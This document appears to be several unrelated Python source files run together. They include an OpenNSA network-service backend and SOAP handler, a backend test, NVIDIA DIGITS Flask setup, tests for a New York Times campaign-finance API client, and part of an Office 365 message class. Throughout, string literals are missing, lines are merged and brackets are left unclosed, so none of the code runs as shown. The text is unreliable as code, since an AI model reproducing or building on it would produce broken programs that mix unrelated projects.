return port + + str ( label_value ) # port contains router and port \n 
\n 
\n 
~~ def getTarget ( self , port , label_type , label_value ) : \n 
~~~ assert label_type in ( None , cnt . ETHERNET_VLAN ) , \n 
if label_type == cnt . ETHERNET_VLAN : \n 
~~~ vlan = int ( label_value ) \n 
assert 1 <= vlan <= 4095 , % label_value \n 
\n 
~~ ri = self . port_map [ port ] \n 
router , interface = ri . split ( ) \n 
return NCSVPNTarget ( router , interface , vlan ) \n 
\n 
\n 
~~ def createConnectionId ( self , source_target , dest_target ) : \n 
~~~ return + str ( random . randint ( 100000 , 999999 ) ) \n 
\n 
\n 
~~ def canSwapLabel ( self , label_type ) : \n 
~~~ return label_type == cnt . ETHERNET_VLAN \n 
\n 
\n 
~~ def _createAuthzHeader ( self ) : \n 
~~~ return + base64 . b64encode ( self . user + + self . password ) \n 
\n 
\n 
~~ def _createHeaders ( self ) : \n 
~~~ headers = { } \n 
headers [ ] = \n 
headers [ ] = self . _createAuthzHeader ( ) \n 
return headers \n 
\n 
~~ def setupLink ( self , connection_id , source_target , dest_target , bandwidth ) : \n 
~~~ service_url = self . ncs_services_url + + NO_OUT_OF_SYNC_CHECK \n 
payload = createVPNPayload ( connection_id , source_target , dest_target ) \n 
headers = self . _createHeaders ( ) \n 
\n 
def linkUp ( _ ) : \n 
~~~ log . msg ( % ( source_target , dest_target ) , system = self . log_system ) \n 
\n 
~~ def error ( failure ) : \n 
~~~ log . msg ( % ( source_target , dest_target ) , system = self . log_system log . msg ( % _extractErrorMessage ( failure ) , system = self . log_system ) \n 
return failure \n 
\n 
~~ d = httpclient . httpRequest ( service_url , payload , headers , method = , timeout = NCS_TIMEOUT d . addCallbacks ( linkUp , error ) \n 
return d \n 
\n 
\n 
~~ def teardownLink ( self , connection_id , source_target , dest_target , bandwidth ) : \n 
~~~ service_url = self . ncs_services_url + + connection_id + + NO_OUT_OF_SYNC_CHECK \n 
headers = self . _createHeaders ( ) \n 
\n 
def linkDown ( _ ) : \n 
~~~ log . msg ( % ( source_target , dest_target ) , system = self . log_system ) \n 
\n 
~~ def error ( failure ) : \n 
~~~ log . msg ( % ( source_target , dest_target ) , system = self . log . msg ( % _extractErrorMessage ( failure ) , system = self . log_system ) \n 
return failure \n 
\n 
~~ d = httpclient . httpRequest ( service_url , None , headers , method = , timeout = NCS_TIMEOUT ) d . addCallbacks ( linkDown , error ) \n 
return d \n 
\n 
\n 
\n 
~~ ~~ def NCSVPNBackend ( network_name , nrm_ports , parent_requester , cfg ) : \n 
\n 
~~~ name = % network_name \n 
nrm_map = dict ( [ ( p . name , p ) for p in nrm_ports ] ) # for the generic backend \n 
port_map = dict ( [ ( p . name , p . interface ) for p in nrm_ports ] ) # for the nrm backend \n 
\n 
# extract config items \n 
ncs_services_url = str ( cfg [ config . NCS_SERVICES_URL ] ) # convert from unicode \n 
user = cfg [ config . NCS_USER ] \n 
password = cfg [ config . NCS_PASSWORD ] \n 
\n 
cm = NCSVPNConnectionManager ( ncs_services_url , user , password , port_map , name ) \n 
return genericbackend . GenericBackend ( network_name , nrm_map , cm , parent_requester , name ) \n 
\n 
~~ """\nWeb Service Resource for OpenNSA.\n\nThis module turns soap data into usefull data structures.\n\nAuthor: Henrik Thostrup Jensen <htj@nordu.net>\nCopyright: NORDUnet (2011-2015)\n""" \n 
\n 
import time \n 
\n 
from twisted . python import log , failure \n 
\n 
from opennsa import nsa , error \n 
from opennsa . shared import xmlhelper \n 
from opennsa . protocols . shared import minisoap , soapresource \n 
from opennsa . protocols . nsi2 import helper , queryhelper \n 
from opennsa . protocols . nsi2 . bindings import actions , nsiconnection , p2pservices \n 
\n 
\n 
\n 
LOG_SYSTEM = \n 
\n 
\n 
\n 
class ProviderService : \n 
\n 
~~~ def __init__ ( self , soap_resource , provider ) : \n 
\n 
~~~ self . provider = provider \n 
\n 
soap_resource . registerDecoder ( actions . RESERVE , self . reserve ) \n 
soap_resource . registerDecoder ( actions . RESERVE_COMMIT , self . reserveCommit ) \n 
soap_resource . registerDecoder ( actions . RESERVE_ABORT , self . reserveAbort ) \n 
\n 
soap_resource . registerDecoder ( actions . PROVISION , self . provision ) \n 
soap_resource . registerDecoder ( actions . RELEASE , self . release ) \n 
soap_resource . registerDecoder ( actions . TERMINATE , self . terminate ) \n 
\n 
soap_resource . registerDecoder ( actions . QUERY_SUMMARY , self . querySummary ) \n 
soap_resource . registerDecoder ( actions . QUERY_SUMMARY_SYNC , self . querySummarySync ) \n 
soap_resource . registerDecoder ( actions . QUERY_RECURSIVE , self . queryRecursive ) \n 
\n 
# Some actions still missing \n 
\n 
\n 
~~ def _createSOAPFault ( self , err , provider_nsa , connection_id = None , service_type = None ) : \n 
\n 
~~~ log . msg ( % err . getErrorMessage ( ) , system \n 
se = helper . createServiceException ( err , provider_nsa , connection_id ) \n 
ex_element = se . xml ( nsiconnection . serviceException ) \n 
\n 
soap_fault = soapresource . SOAPFault ( err . getErrorMessage ( ) , ex_element ) \n 
return soap_fault \n 
\n 
\n 
~~ def reserve ( self , soap_data , request_info ) : \n 
\n 
~~~ t_start = time . time ( ) \n 
\n 
header , reservation = helper . parseRequest ( soap_data ) \n 
\n 
# do some checking here \n 
\n 
#        print header.protocolVersion \n 
#        print header.correlationId \n 
#        print header.requesterNSA \n 
#        print header.providerNSA \n 
#        print header.replyTo \n 
\n 
criteria = reservation . criteria \n 
\n 
#version      = criteria.version # not used at the moment \n 
service_type = criteria . serviceType # right now we just ignore this, either we know the service type or not p2ps = criteria . serviceDefinition \n 
\n 
#        if len(service_defs) == 0: \n 
#            return self._createSOAPFault(err, header.provider_nsa, service_type=service_type) \n 
\n 
#        if len(service_defs) != 1: \n 
\n 
#            return self._createSOAPFault(err, header.provider_nsa, service_type=service_type) \n 
\n 
if type ( p2ps ) is not p2pservices . P2PServiceBaseType : \n 
~~~ err = failure . Failure ( error . PayloadError ( return self . _createSOAPFault ( err , header . provider_nsa , service_type = service_type ) \n 
\n 
~~ if p2ps . directionality in ( None , ) : \n 
~~~ err = failure . Failure ( error . MissingParameterError ( return self . _createSOAPFault ( err , header . provider_nsa ) \n 
\n 
# create DTOs (EROs not supported yet) \n 
\n 
~~ start_time = xmlhelper . parseXMLTimestamp ( criteria . schedule . startTime ) if criteria . schedule . startTime end_time = xmlhelper . parseXMLTimestamp ( criteria . schedule . endTime ) if criteria . schedule . endTime schedule = nsa . Schedule ( start_time , end_time ) \n 
\n 
src_stp = helper . createSTP ( p2ps . sourceSTP ) \n 
dst_stp = helper . createSTP ( p2ps . destSTP ) \n 
\n 
if p2ps . ero : \n 
~~~ err = failure . Failure ( error . PayloadError ( ) ) \n 
return self . _createSOAPFault ( err , header . provider_nsa ) \n 
\n 
#        if p2ps.parameter: \n 
#            p = p2ps.parameter[0] \n 
#            return self._createSOAPFault(err, header.provider_nsa) \n 
~~ params = [ ( p . type_ , p . value ) for p in p2ps . parameter ] if p2ps . parameter else None \n 
symmetric = p2ps . symmetricPath or False sd = nsa . Point2PointService ( src_stp , dst_stp , p2ps . capacity , p2ps . directionality , symmetric , \n 
crt = nsa . Criteria ( criteria . version , schedule , sd ) \n 
\n 
t_delta = time . time ( ) - t_start \n 
log . msg ( % round ( t_delta , 3 ) , profile = True , system = \n 
d = self . provider . reserve ( header , reservation . connectionId , reservation . globalReservationId , \n 
def createReserveAcknowledgement ( connection_id ) : \n 
# no reply to / security attrs / trace \n 
~~~ soap_header_element = helper . createProviderHeader ( header . requester_nsa , header . provider_nsa \n 
reserve_response = nsiconnection . ReserveResponseType ( connection_id ) \n 
reserve_response_element = reserve_response . xml ( nsiconnection . reserveResponse ) \n 
\n 
payload = minisoap . createSoapPayload ( reserve_response_element , soap_header_element ) \n 
return payload \n 
\n 
\n 
~~ d . addCallbacks ( createReserveAcknowledgement , self . _createSOAPFault , errbackArgs = ( header . provider_nsa return d \n 
\n 
\n 
\n 
~~ def reserveCommit ( self , soap_data , request_info ) : \n 
~~~ header , confirm = helper . parseRequest ( soap_data ) \n 
d = self . provider . reserveCommit ( header , confirm . connectionId , request_info ) \n 
d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault return d \n 
\n 
\n 
~~ def reserveAbort ( self , soap_data , request_info ) : \n 
~~~ header , request = helper . parseRequest ( soap_data ) \n 
d = self . provider . reserveAbort ( header , request . connectionId , request_info ) \n 
d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault return d \n 
\n 
\n 
~~ def provision ( self , soap_data , request_info ) : \n 
~~~ header , request = helper . parseRequest ( soap_data ) \n 
d = self . provider . provision ( header , request . connectionId , request_info ) \n 
d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault return d \n 
\n 
\n 
~~ def release ( self , soap_data , request_info ) : \n 
~~~ header , request = helper . parseRequest ( soap_data ) \n 
d = self . provider . release ( header , request . connectionId , request_info ) \n 
d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault return d \n 
\n 
\n 
~~ def terminate ( self , soap_data , request_info ) : \n 
\n 
~~~ header , request = helper . parseRequest ( soap_data ) \n 
d = self . provider . terminate ( header , request . connectionId , request_info ) \n 
d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault return d \n 
\n 
\n 
~~ def querySummary ( self , soap_data , request_info ) : \n 
\n 
~~~ header , query = helper . parseRequest ( soap_data ) \n 
d = self . provider . querySummary ( header , query . connectionId , query . globalReservationId , request_info d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault return d \n 
\n 
\n 
~~ def querySummarySync ( self , soap_data , request_info ) : \n 
\n 
~~~ def gotReservations ( reservations , header ) : \n 
# do reply inline \n 
~~~ soap_header_element = helper . createProviderHeader ( header . requester_nsa , header . provider_nsa \n 
qs_reservations = queryhelper . buildQuerySummaryResultType ( reservations ) \n 
\n 
qsct = nsiconnection . QuerySummaryConfirmedType ( qs_reservations ) \n 
\n 
payload = minisoap . createSoapPayload ( qsct . xml ( nsiconnection . querySummarySyncConfirmed ) , return payload \n 
\n 
~~ header , query = helper . parseRequest ( soap_data ) \n 
d = self . provider . querySummarySync ( header , query . connectionId , query . globalReservationId , request_info d . addCallbacks ( gotReservations , self . _createSOAPFault , callbackArgs = ( header , ) , errbackArgs = ( return d \n 
\n 
\n 
~~ def queryRecursive ( self , soap_data , request_info ) : \n 
\n 
~~~ header , query = helper . parseRequest ( soap_data ) \n 
d = self . provider . queryRecursive ( header , query . connectionId , query . globalReservationId , request_info d . addCallbacks ( lambda _ : helper . createGenericProviderAcknowledgement ( header ) , self . _createSOAPFault return d \n 
\n 
~~ ~~ import os , datetime , json \n 
\n 
from twisted . trial import unittest \n 
from twisted . internet import defer , task \n 
\n 
from opennsa import config , nsa , database \n 
from opennsa . topology import nml \n 
from opennsa . backends import ncsvpn \n 
\n 
from . import common \n 
\n 
\n 
class NCSVPNBackendTest ( unittest . TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
\n 
~~~ self . clock = task . Clock ( ) \n 
\n 
tcf = os . path . expanduser ( ) \n 
tc = json . load ( open ( tcf ) ) \n 
\n 
ncs_config = { \n 
config . NCS_SERVICES_URL : tc [ ] , \n 
config . NCS_USER : tc [ ] , \n 
config . NCS_PASSWORD : tc [ ] \n 
} \n 
\n 
self . requester = common . DUDRequester ( ) \n 
\n 
self . backend = ncsvpn . NCSVPNBackend ( , self . sr , self . requester , ncs_config ) \n 
self . backend . scheduler . clock = self . clock \n 
\n 
self . backend . startService ( ) \n 
\n 
database . setupDatabase ( tc [ ] , tc [ ] , tc [ ] ) \n 
\n 
self . requester_nsa = nsa . NetworkServiceAgent ( , self . provider_nsa = nsa . NetworkServiceAgent ( , \n 
source_stp = nsa . STP ( , , labels = [ nsa . Label ( nml . ETHERNET_VLAN , dest_stp = nsa . STP ( , , labels = [ nsa . Label ( nml . ETHERNET_VLAN , start_time = datetime . datetime . utcnow ( ) + datetime . timedelta ( seconds = 2 ) \n 
end_time = datetime . datetime . utcnow ( ) + datetime . timedelta ( seconds = 30 ) \n 
bandwidth = 200 \n 
self . service_params = nsa . ServiceParameters ( start_time , end_time , source_stp , dest_stp , bandwidth \n 
\n 
\n 
~~ @ defer . inlineCallbacks \n 
def tearDown ( self ) : \n 
~~~ from opennsa . backends . common import simplebackend \n 
# delete all created connections from test database \n 
yield simplebackend . Simplebackendconnection . deleteAll ( ) \n 
yield self . backend . stopService ( ) \n 
\n 
\n 
~~ @ defer . inlineCallbacks \n 
def testActivation ( self ) : \n 
\n 
#        d_up = defer.Deferred() \n 
#        d_down = defer.Deferred() \n 
# \n 
#        def errorEvent(requester_nsa, provider_nsa, session_security_attr, connection_id, event, connection_states, timestamp, info, ex): #            print "errorEvent", event, info, ex \n 
# \n 
#        def dataPlaneChange(requester_nsa, provider_nsa, session_security_attr, connection_id, dps, timestamp): #            active, version, version_consistent = dps \n 
#            values = connection_id, active, version_consistent, version, timestamp \n 
#            if active: \n 
#                d_up.callback(values) \n 
#            else: \n 
#                d_down.callback(values) \n 
# \n 
#        self.sr.registerEventHandler(registry.ERROR_EVENT,        errorEvent,      self.registry_system) #        self.sr.registerEventHandler(registry.DATA_PLANE_CHANGE,  dataPlaneChange, self.registry_system) \n 
~~~ _ , _ , cid , sp = yield self . reserve ( self . requester_nsa , self . provider_nsa , None , None , None , None yield self . backend . reserveCommit ( self . requester_nsa , self . provider_nsa , None , cid ) \n 
yield self . backend . provision ( self . requester_nsa , self . provider_nsa , None , cid ) \n 
self . clock . advance ( 3 ) \n 
\n 
connection_id , active , version_consistent , version , timestamp = yield d_up \n 
self . failUnlessEqual ( cid , connection_id ) \n 
self . failUnlessEqual ( active , True ) \n 
self . failUnlessEqual ( version_consistent , True ) \n 
\n 
#yield self.release(self.requester_nsa, self.provider_nsa, None, cid) \n 
yield self . backend . terminate ( self . requester_nsa , self . provider_nsa , None , cid ) \n 
\n 
connection_id , active , version_consistent , version , timestamp = yield d_down \n 
self . failUnlessEqual ( cid , connection_id ) \n 
self . failUnlessEqual ( active , False ) \n 
self . failUnlessEqual ( version_consistent , True ) \n 
\n 
~~ testActivation . skip = \n 
\n 
# Copyright (c) 2014-2016, NVIDIA CORPORATION.  All rights reserved. \n 
~~ from __future__ import absolute_import \n 
\n 
from . classification import * \n 
from . generic import * \n 
from . job import ImageDatasetJob \n 
# Copyright (c) 2016, NVIDIA CORPORATION.  All rights reserved. \n 
from __future__ import absolute_import \n 
\n 
from . images import * \n 
from . job import InferenceJob \n 
\n 
# Copyright (c) 2014-2016, NVIDIA CORPORATION.  All rights reserved. \n 
from __future__ import absolute_import \n 
\n 
from . caffe_train import CaffeTrainTask \n 
from . torch_train import TorchTrainTask \n 
from . train import TrainTask \n 
# Copyright (c) 2014-2016, NVIDIA CORPORATION.  All rights reserved. \n 
from __future__ import absolute_import \n 
\n 
import flask \n 
from flask . ext . socketio import SocketIO \n 
from gevent import monkey ; monkey . patch_all ( ) \n 
\n 
from . config import config_value \n 
from digits import utils \n 
import digits . scheduler \n 
\n 
### Create Flask, Scheduler and SocketIO objects \n 
\n 
app = flask . Flask ( __name__ ) \n 
app . config [ ] = True \n 
# Disable CSRF checking in WTForms \n 
app . config [ ] = False \n 
# This is still necessary for SocketIO \n 
app . config [ ] = config_value ( ) \n 
app . url_map . redirect_defaults = False \n 
socketio = SocketIO ( app ) \n 
scheduler = digits . scheduler . Scheduler ( config_value ( ) , True ) \n 
\n 
### Register filters and views \n 
\n 
app . jinja_env . globals [ ] = config_value ( ) \n 
app . jinja_env . globals [ ] = digits . __version__ \n 
app . jinja_env . filters [ ] = utils . time_filters . print_time \n 
app . jinja_env . filters [ ] = utils . time_filters . print_time_diff \n 
app . jinja_env . filters [ ] = utils . time_filters . print_time_since \n 
app . jinja_env . filters [ ] = utils . sizeof_fmt \n 
app . jinja_env . filters [ ] = utils . auth . has_permission \n 
app . jinja_env . trim_blocks = True \n 
app . jinja_env . lstrip_blocks = True \n 
\n 
import digits . views \n 
app . register_blueprint ( digits . views . blueprint ) \n 
import digits . dataset . views \n 
app . register_blueprint ( digits . dataset . views . blueprint , url_prefix = ) \n 
import digits . dataset . images . views \n 
app . register_blueprint ( digits . dataset . images . views . blueprint , url_prefix = ) \n 
import digits . dataset . images . classification . views \n 
app . register_blueprint ( digits . dataset . images . classification . views . blueprint , url_prefix = import digits . dataset . images . generic . views \n 
app . register_blueprint ( digits . dataset . images . generic . views . blueprint , url_prefix = import digits . model . views \n 
app . register_blueprint ( digits . model . views . blueprint , url_prefix = ) \n 
import digits . model . images . views \n 
app . register_blueprint ( digits . model . images . views . blueprint , url_prefix = ) \n 
import digits . model . images . classification . views \n 
app . register_blueprint ( digits . model . images . classification . views . blueprint , url_prefix = import digits . model . images . generic . views \n 
app . register_blueprint ( digits . model . images . generic . views . blueprint , url_prefix = \n 
def username_decorator ( f ) : \n 
~~~ from functools import wraps \n 
@ wraps ( f ) \n 
def decorated ( * args , ** kwargs ) : \n 
~~~ this_username = flask . request . cookies . get ( , None ) \n 
app . jinja_env . globals [ ] = this_username \n 
return f ( * args , ** kwargs ) \n 
~~ return decorated \n 
\n 
~~ for endpoint , function in app . view_functions . iteritems ( ) : \n 
~~~ app . view_functions [ endpoint ] = username_decorator ( function ) \n 
\n 
### Setup the environment \n 
\n 
~~ scheduler . load_past_jobs ( ) \n 
import os \n 
import unittest \n 
import requests \n 
import requests_cache \n 
\n 
from nytcampfin import NytCampfin , NytCampfinError , NytNotFoundError \n 
\n 
CURRENT_CYCLE = 2012 \n 
try : \n 
~~~ API_KEY = os . environ [ ] \n 
~~ except : \n 
~~~ print "Please set your API Key as an environment variable" \n 
\n 
\n 
~~ class APITest ( unittest . TestCase ) : \n 
\n 
~~~ def check_response ( self , result , url , parse = lambda r : r [ ] ) : \n 
~~~ with requests_cache . disabled ( ) : # test requests should not be cached \n 
~~~ response = requests . get ( url ) \n 
if parse and callable ( parse ) : \n 
~~~ response = parse ( response . json ) \n 
~~ self . assertEqual ( result , response ) \n 
\n 
~~ ~~ def setUp ( self ) : \n 
~~~ self . finance = NytCampfin ( API_KEY ) \n 
\n 
~~ ~~ class FilingTest ( APITest ) : \n 
\n 
~~~ def test_todays_filings ( self ) : \n 
~~~ today = self . finance . filings . today ( offset = 20 ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/filings.json?api-key=%s&offset=20" self . check_response ( today , url ) \n 
\n 
~~ def test_filings_for_date ( self ) : \n 
~~~ july4th = self . finance . filings . date ( 2012 , 0 7 , 0 4 ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/filings/2012/07/04.json?api-key=%s" self . check_response ( july4th , url ) \n 
\n 
~~ def test_form_types ( self ) : \n 
~~~ form_types = self . finance . filings . form_types ( ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/filings/types.json?api-key=%s" self . check_response ( form_types , url ) \n 
\n 
~~ def test_filings_by_form_type ( self ) : \n 
~~~ f2s = self . finance . filings . by_type ( ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/filings/types/f2.json?api-key=%s" self . check_response ( f2s , url ) \n 
\n 
~~ def test_amended_filings ( self ) : \n 
~~~ amendments = self . finance . filings . amendments ( ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/filings/amendments.json?api-key=%s" self . check_response ( amendments , url ) \n 
\n 
~~ ~~ class IndependentExpenditureTest ( APITest ) : \n 
\n 
~~~ def test_latest ( self ) : \n 
~~~ latest = self . finance . indexp . latest ( ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/independent_expenditures.json?api-key=%s" self . check_response ( latest , url ) \n 
\n 
~~ def test_ies_for_date ( self ) : \n 
~~~ july3rd = self . finance . indexp . date ( 2012 , 0 7 , 0 3 ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/independent_expenditures/2012/07/03.json?api-key=%s" self . check_response ( july3rd , url ) \n 
\n 
~~ def test_committee_ies ( self ) : \n 
~~~ ies = self . finance . indexp . committee ( "C00490045" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/committees/C00490045/independent_expenditures.json?api-key=%s" self . check_response ( ies , url ) \n 
\n 
~~ def test_race_totals ( self ) : \n 
~~~ races = self . finance . indexp . race_totals ( "president" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/independent_expenditures/race_totals/president.json?api-key=%s" self . check_response ( races , url ) \n 
\n 
~~ def test_candidate_ies ( self ) : \n 
~~~ ies = self . finance . indexp . candidate ( "P00003608" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/candidates/P00003608/independent_expenditures.json?api-key=%s" self . check_response ( ies , url ) \n 
\n 
~~ def test_president_ies ( self ) : \n 
~~~ ies = self . finance . indexp . president ( ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/president/independent_expenditures.json?api-key=%s" self . check_response ( ies , url ) \n 
\n 
~~ def test_superpacs ( self ) : \n 
~~~ superpacs = self . finance . indexp . superpacs ( ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/committees/superpacs.json?api-key=%s" self . check_response ( superpacs , url ) \n 
\n 
\n 
~~ ~~ class CandidateTest ( APITest ) : \n 
\n 
~~~ def test_latest ( self ) : \n 
~~~ latest = self . finance . candidates . latest ( ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/candidates/new.json?api-key=%s" self . check_response ( latest , url ) \n 
\n 
~~ def test_detail ( self ) : \n 
~~~ detail = self . finance . candidates . get ( "H4NY11138" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/candidates/H4NY11138.json?api-key=%s" response = requests . get ( url ) \n 
self . check_response ( detail , url , parse = lambda r : r [ ] [ 0 ] ) \n 
\n 
~~ def test_filter ( self ) : \n 
~~~ wilson = self . finance . candidates . filter ( "Wilson" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/candidates/search.json?api-key=%s&query=Wilson" self . check_response ( wilson , url ) \n 
\n 
~~ def test_leaders ( self ) : \n 
~~~ loans = self . finance . candidates . leaders ( "candidate-loan" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/candidates/leaders/candidate-loan.json?api-key=%s" self . check_response ( loans , url ) \n 
\n 
~~ def test_candidates_for_state ( self ) : \n 
~~~ candidates = self . finance . candidates . seats ( ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/seats/RI.json?api-key=%s" % self . check_response ( candidates , url ) \n 
\n 
~~ def test_candidates_for_state_and_chamber ( self ) : \n 
~~~ candidates = self . finance . candidates . seats ( , ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/seats/MD/senate.json?api-key=%s" self . check_response ( candidates , url ) \n 
\n 
~~ def test_candidates_for_state_and_chamber_and_district ( self ) : \n 
~~~ candidates = self . finance . candidates . seats ( , , 6 ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/seats/MD/house/6.json?api-key=%s" self . check_response ( candidates , url ) \n 
\n 
~~ def test_late_contributions ( self ) : \n 
~~~ late_contribs = self . finance . candidates . late_contributions ( "H0TN08246" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/candidates/H0TN08246/48hour.json?api-key=%s" self . check_response ( late_contribs , url ) \n 
\n 
\n 
~~ ~~ class CommitteeTest ( APITest ) : \n 
\n 
~~~ def test_latest ( self ) : \n 
~~~ latest = self . finance . committees . latest ( ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/committees/new.json?api-key=%s" self . check_response ( latest , url ) \n 
\n 
~~ def test_detail ( self ) : \n 
~~~ detail = self . finance . committees . get ( "C00490045" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/committees/C00490045.json?api-key=%s" response = requests . get ( url ) \n 
self . check_response ( detail , url , parse = lambda r : r [ ] [ 0 ] ) \n 
\n 
~~ def test_filter ( self ) : \n 
~~~ hallmark = self . finance . committees . filter ( "Hallmark" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/committees/search.json?api-key=%s&query=Hallmark" self . check_response ( hallmark , url ) \n 
\n 
~~ def test_contributions ( self ) : \n 
~~~ contributions = self . finance . committees . contributions ( "C00381277" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/committees/C00381277/contributions.json?api-key=%s" self . check_response ( contributions , url ) \n 
\n 
~~ def test_contributions_to_candidate ( self ) : \n 
~~~ contributions = self . finance . committees . contributions_to_candidate ( "C00007450" , "H0PA12132" ) url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/committees/C00007450/contributions/candidates/H0PA12132.json?api-key=%s" self . check_response ( contributions , url ) \n 
\n 
~~ def test_late_contributions ( self ) : \n 
~~~ late_contribs = self . finance . committees . late_contributions ( "C00466854" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/committees/C00466854/48hour.json?api-key=%s" self . check_response ( late_contribs , url ) \n 
\n 
~~ def test_filings ( self ) : \n 
~~~ filings = self . finance . committees . filings ( "C00490045" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/committees/C00490045/filings.json?api-key=%s" self . check_response ( filings , url ) \n 
\n 
~~ def test_ie_totals ( self ) : \n 
~~~ ie_totals = self . finance . committees . ie_totals ( "C00490045" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/committees/C00490045/independent_expenditures/races.json?api-key=%s" self . check_response ( ie_totals , url ) \n 
\n 
~~ def test_leadership ( self ) : \n 
~~~ leadership = self . finance . committees . leadership ( ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/committees/leadership.json?api-key=%s" self . check_response ( leadership , url ) \n 
\n 
~~ ~~ class LateContributionTest ( APITest ) : \n 
\n 
~~~ def test_latest ( self ) : \n 
~~~ late_contribs = self . finance . late_contribs . latest ( ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/contributions/48hour.json?api-key=%s" self . check_response ( late_contribs , url ) \n 
\n 
~~ def test_date ( self ) : \n 
~~~ late_contribs = self . finance . late_contribs . date ( 2012 , 3 , 23 ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/contributions/48hour/2012/3/23.json?api-key=%s" self . check_response ( late_contribs , url ) \n 
\n 
~~ ~~ class PresidentTest ( APITest ) : \n 
\n 
~~~ def test_candidates ( self ) : \n 
~~~ candidates = self . finance . president . candidates ( ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/president/totals.json?api-key=%s" self . check_response ( candidates , url ) \n 
\n 
~~ def test_detail_using_id ( self ) : \n 
~~~ candidate = self . finance . president . detail ( "C00431445" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/president/candidates/C00431445.json?api-key=%s" self . check_response ( candidate , url , parse = lambda r : r [ ] [ 0 ] ) \n 
\n 
~~ def test_detail_using_name ( self ) : \n 
~~~ candidate = self . finance . president . detail ( "obama" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/president/candidates/obama.json?api-key=%s" self . check_response ( candidate , url , parse = lambda r : r [ ] [ 0 ] ) \n 
\n 
~~ def test_state_total ( self ) : \n 
~~~ state = self . finance . president . state ( "AZ" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/president/states/AZ.json?api-key=%s" self . check_response ( state , url ) \n 
\n 
~~ def test_zip_total ( self ) : \n 
~~~ zipcode = self . finance . president . zipcode ( "33407" ) \n 
url = "http://api.nytimes.com/svc/elections/us/v3/finances/2012/president/zips/33407.json?api-key=%s" self . check_response ( zipcode , url ) \n 
\n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) from O365 . attachment import Attachment \n 
~~ from O365 . contact import Contact \n 
from O365 . group import Group \n 
import logging \n 
import json \n 
import requests \n 
\n 
logging . basicConfig ( filename = , level = logging . DEBUG ) \n 
\n 
log = logging . getLogger ( __name__ ) \n 
\n 
class Message ( object ) : \n 
~~~ \n 
\n 
att_url = \n 
send_url = \n 
draft_url = \n 
update_url = \n 
\n 
def __init__ ( self , json = None , auth = None ) : \n 
~~~ \n 
if json : \n 
~~~ self . json = json \n 
self . hasAttachments = json [ ] \n 
\n 
~~ else : \n 
~~~ self . json = { : { : { } } , : { } } \n 
self . hasAttachments = False \n 
\n 
~~ self . auth = auth \n 
self . attachments = [ ] \n 
self . reciever = None \n 
\n 
\n 
~~ def fetchAttachments ( self ) : \n 
~~~ \n 
if not self . hasAttachments : \n 
~~~ log . debug ( ) \n 
return False \n 
\n 
~~ response = requests . get ( self . att_url . format ( self . json [ ] ) , auth = self . auth ) \n 
log . info ( , str ( response ) ) \n 
json = response . json ( ) \n 
\n 
for att in json [ ] : \n 
~~~ try : \n 
~~~ self . attachments . append ( Attachment ( att ) ) \n 
log . debug ( , self . auth [ 0 ] ) \n 
~~ except Exception as e : \n 
~~~ log . info ( , self . auth [ 0 ] ) \n 
\n 
~~ ~~ return len ( self . attachments ) \n 
\n 
~~ def sendMessage ( self ) : \n 
~~~ \n 
\n 
headers = { : , : } \n 
\n 
try : \n 
~~~ data = { : { : { } } } \n 
data [ ] [ ] = self . json [ ] \n 
data [ ] [ ] [ ] = self . json [ ] [ ] \n 
data [ ] [ ] [ ] = self . json [ ] [ ] \n 
data [ ] [ ] = self . json [ ] \n 
data [ ] [ ] = [ att . json for att in self . attachments ] \n 
data [ ] = "false" \n 
data = json . dumps ( data ) \n 
log . debug ( str ( data ) ) \n 
~~ except Exception as e : \n 
~~~ log . error ( str ( e ) ) \n 
